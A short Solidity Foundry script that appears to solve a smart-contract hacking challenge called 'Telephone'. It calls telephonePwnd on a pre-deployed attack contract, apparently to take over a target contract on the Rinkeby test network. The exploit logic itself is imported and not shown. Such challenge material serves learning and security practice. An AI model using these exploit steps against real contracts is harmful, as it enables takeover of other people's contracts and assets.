// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import { Script } from "forge-std/script.sol";

import { TelephoneAttack } from "src/Telephone/TelephoneAttack.sol";

contract TelephoneAttackExistingScript is Script {
    // Affected contract: https://rinkeby.etherscan.io/address/0x9c8c5967d7168f12adc32fb96efadabdb96bed9f#readContract
    TelephoneAttack private telAttack;

    function run() public {
        vm.startBroadcast();
            TelephoneAttack telAttacker = TelephoneAttack(address(0x04B350F41274FcBd7fa2B903EE64b0AFCFE2753f));
            telAttacker.telephonePwnd(address(msg.sender));
        vm.stopBroadcast();
    }
}